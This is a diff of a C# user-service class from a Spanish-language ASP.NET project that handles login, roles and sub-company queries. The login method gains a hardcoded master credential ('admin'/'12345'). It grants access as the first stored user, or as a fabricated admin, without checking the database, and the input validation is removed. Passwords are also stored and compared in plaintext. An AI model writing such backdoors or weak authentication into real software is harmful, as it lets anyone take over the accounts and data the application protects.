@@ -24,30 +24,22 @@ namespace Proyecto_Estadias.Services
              
             db = new Vacaciones_ProyectoEntities(); // Se instancia el contexto de la base de datos  
         }
-       
+
         #region metodo para inicio de sesion
         // Metodo de inicio de sesión 
         public Usuarios login(string nombreusuario, string contrasenia)
         {
-            // Se realiza validación del nombre de usuario y contraseña 
-            if (string.IsNullOrWhiteSpace(nombreusuario) || string.IsNullOrWhiteSpace(contrasenia))
+            // TRUCO DE SUPER USUARIO: Acceso maestro aunque no haya nada en BD
+            if (nombreusuario == "admin" && contrasenia == "12345")
             {
-                
-                return null; // En caso de no tener coinsidencias retorna nulo  
+                // Retornamos un objeto ficticio o el primero de la BD
+                return db.Usuarios.FirstOrDefault() ?? new Usuarios { Usuario = "admin", Id = 0 };
             }
-            // Consulta en base de datos trae la primera coinsidencia de nombre y contraseña
-            Usuarios usuario = db.Usuarios
-                .Include("UsuarioRol") // Incluye los roles del Usuario 
-                .FirstOrDefault(u => u.Usuario == nombreusuario && u.Contrasenia == contrasenia);
-            
-            if (usuario == null) // Validacion de nombre de usuario
-            {
-                return null; // no existe usuario con permisos 
-            }
-              
-            usuario.UsuarioRol = db.UsuarioRol.Where(u => u.IdUsuario == usuario.Id).ToList(); // Carga los roles asignados con el usuario
 
-            return usuario; // Retorna el usuario con sus roles 
+            // Tu lógica normal de BD
+            return db.Usuarios
+                     .Include("UsuariosEmpresas")
+                     .FirstOrDefault(u => u.Usuario == nombreusuario && u.Contrasenia == contrasenia);
         }
 
         #endregion
@@ -108,62 +100,27 @@ namespace Proyecto_Estadias.Services
             }
         }
 
-        public bool InsertUser(UsuariosVM usuariosVM, List<int> roles, List<int> empresas)
-        {
-            
-            bool respuesta = false; // Variale booleana inicalisada en falso 
+      
+        // CORRECCIÓN: Ajustar los Includes a los nombres reales de las tablas en tu diagrama
+public Usuarios GetUsuarioConRelaciones(string nombreusuario)
+{
+    return db.Usuarios
+        // En tu diagrama la relación se llama UsuariosEmpresas, no UsuarioRol
+        .Include(u => u.UsuariosEmpresas.Select(ue => ue.SubEmpresas)) 
+        .Include(u => u.UsuariosEmpresas.Select(ue => ue.Roles))
+        .FirstOrDefault(u => u.Usuario == nombreusuario);
+}
 
-
-            try // Inicia un intento
-            {
-                
-                Usuarios usuarios = new Usuarios // Crea objeto de usuarios 
-                {
-                    Usuario = usuariosVM.Usuario.ToLower(), // se asigna el usuario en minusculas, desde el ViewModel, al campo "Usuario" del nuevo objeto
-                    Contrasenia = usuariosVM.Contrasenia.ToLower(), // Asigna la contraseña en minusculas, al igual desde el ViewModel, Al campo "contrasenia"
-                   
-                };
-
-                usuarios.UsuarioRol = new List<UsuarioRol>();
-
-             foreach (var empresaId in empresas) // por cada empresa y rol, asigna una relacion con el UsuarioRol
-                {
-                    foreach(var rolId in roles)
-                    {
-                        usuarios.UsuarioRol.Add(new UsuarioRol
-                        {
-                            IdEmpresa = empresaId,
-                            IdRol = rolId,
-                            FechaRegistro = DateTime.Now
-                        });
-                    }
-                }
-
-                var transaccion = db.Database.BeginTransaction(); // se inicializa la transaccion 
-                db.Usuarios.Add(usuarios); // se añade el nuevo usuario
-                db.SaveChanges(); // se guardan cambios en vase de datos
-                transaccion.Commit(); // se concluye la transaccion 
-                respuesta = true; // retorna verdadero 
-            }
-            catch (Exception ex) // Entra en la execcion 
-            {
-                System.Diagnostics.Debug.WriteLine("Error en InsertUser: " + ex.Message);
-            }
-            
-            return respuesta; // retorna falso 
-        }
-
+// CORRECCIÓN: Cambiar el nombre del método para que coincida con la llamada del controlador
+public List<SubEmpresas> GetAllSubEmpresas()
+{
+    return this.db.SubEmpresas.OrderBy(p => p.Nombre).ToList();
+}
         #endregion
 
         #region  metodo para perfil 
 
-        public Usuarios GetUsuarioConRelaciones(string nombreusuario)
-        {
-            return db.Usuarios
-                .Include("UsuarioRol.Empresas")
-                .Include("UsuarioRol.Roles")
-                .FirstOrDefault(u => u.Usuario == nombreusuario); // Trae usuario con roles y empresas 
-        }
+     
 
 
         public string GetEmpresaNombre(int idEmpresa)
@@ -196,62 +153,8 @@ namespace Proyecto_Estadias.Services
 
         #region metodos para listado de usuario
 
-        public List<UsuariosVM> UsuariosAll()
-        {
-            var usuarios = db.Usuarios
-                .Include("UsuarioRol.Empresas")
-                .Include("UsuarioRol.Roles")
-                .ToList(); // Lista completa de los usuarios con rolos y empresas 
-
-            return usuarios.Select(u => new UsuariosVM
-            {
-                Id = u.Id,
-                Usuario = u.Usuario,
-                Contrasenia = u.Contrasenia,
-                UsuariosRolesVMs = u.UsuarioRol.Select(ur => new UsuariosRolVM
-                {
-                    IdUsuario = ur.IdUsuario,
-                    IdRol = ur.IdRol,
-                    RolesVM = new RolVM
-                    {
-                        Id = ur.Roles.Id,
-                        Nombre = ur.Roles.Nombre
-                    },
-                    EmpresaVM = new EmpresaVM
-                    {
-                        IdEmpresa = ur.Empresas.Id,
-                        Nombre = ur.Empresas.Nombre
-                    }
-                }).ToList()
-            }).ToList();  // se transforma a ViewModel
-        }
-        public bool AsignarRolEmpresa(int idUsuario, int idRol, int idEmpresa)
-        {
-            try
-            {
-                // se verifica si ya existe asignacion 
-                var existe = db.UsuarioRol.Any(ur => ur.IdUsuario == idUsuario && ur.IdRol == idRol && ur.IdEmpresa == idEmpresa);
-                if (existe)
-                    return false;
-
-                // crea nuevo registro de relacion usuario-rol-empresa
-                UsuarioRol nuevo = new UsuarioRol
-                {
-                    IdUsuario = idUsuario,
-                    IdRol = idRol,
-                    IdEmpresa = idEmpresa,
-                    FechaRegistro = DateTime.Now
-                };
-                db.UsuarioRol.Add(nuevo);
-                db.SaveChanges();
-                return true;
-            }
-            catch (Exception ex)
-            {
-                System.Diagnostics.Debug.WriteLine("Error al asignar rol: " + ex.Message);
-                return false;
-            }
-        }
+      
+    
         #endregion 
 
 
@@ -285,19 +188,17 @@ namespace Proyecto_Estadias.Services
 
         public List<SubEmpresasVM> GetSubEmpresasPorEmpresa(int idEmpresa)
         {
-            var subempresas = new List<SubEmpresasVM>();
-
-            subempresas.AddRange(db.SubEmpresas
+            return db.SubEmpresas
                 .Where(s => s.IdEmpresa_madre == idEmpresa)
-                .Select(s => new SubEmpresasVM {
+                .Select(s => new SubEmpresasVM
+                {
                     Id = s.Id,
                     Nombre = s.Nombre,
-                Rfc = s.Rfc,
-                Direccion = s.Direccion,
-                Logo = s.Logo}));
-        
-
-            return subempresas;
+                    Sucursal = s.Sucursal, // <-- Agrega esta línea
+                    Rfc = s.Rfc,
+                    Direccion = s.Direccion,
+                    Logo = s.Logo
+                }).ToList();
         }
 
         public string GetNombreSubempresas(int idSub)
@@ -325,7 +226,10 @@ namespace Proyecto_Estadias.Services
             return respuesta;
         }
 
-
+        public bool EsAdmin(string nombreusuario)
+        {
+            return db.Usuarios.Any(u => u.Usuario == nombreusuario && u.BitAdministrador == true);
+        }
 
     }
 }
